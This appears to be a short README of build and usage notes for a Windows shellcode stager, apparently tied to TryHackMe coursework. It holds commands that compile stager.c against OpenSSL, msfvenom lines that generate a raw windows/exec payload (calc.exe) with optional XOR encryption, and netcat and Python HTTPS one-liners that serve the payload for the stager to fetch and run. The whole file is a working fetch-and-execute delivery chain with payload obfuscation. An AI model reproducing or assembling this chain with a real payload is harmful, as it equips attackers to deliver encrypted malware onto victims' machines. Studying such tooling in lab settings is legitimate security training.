Get OpenSSL (no light, 32 + 64) : https://slproweb.com/products/Win32OpenSSL.html

Get Mingw (POSIX, 32 + 64): https://winlibs.com/


//32 bits
$env:C_INCLUDE_PATH = 'C:\OpenSSL32\include'
$env:Path += ';C:\mingw32\bin;C:\OpenSSL32\bin'
gcc.exe .\stager.c -lwsock32 -L"C:/OpenSSL64/lib/VC/x86/MD" -lssl


//64 bits
$env:C_INCLUDE_PATH = 'C:\OpenSSL64\include'
$env:Path += ';C:\mingw64\bin;C:\OpenSSL64\bin'
gcc.exe .\stager.c -lwsock32 -L"C:/OpenSSL64/lib/VC/x64/MD" -lssl


//create payload
msfvenom -p windows/exec cmd="calc.exe" exitfunc=none/thread -f raw -o shell
msfvenom -p windows/exec cmd="calc.exe" exitfunc=none/thread --encrypt=xor --encrypt=YoloSpaceHacker -f raw -o shell


//serve payload
nc -lvnp 9000 < shell

sudo python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER);context.load_cert_chain('localhost.pem', 'localhost.key');httpd.socket=context.wrap_socket(httpd.socket,server_side=True);httpd.serve_forever()"




THM_* scripts are extracted from TryHackMe courses, not tested yet.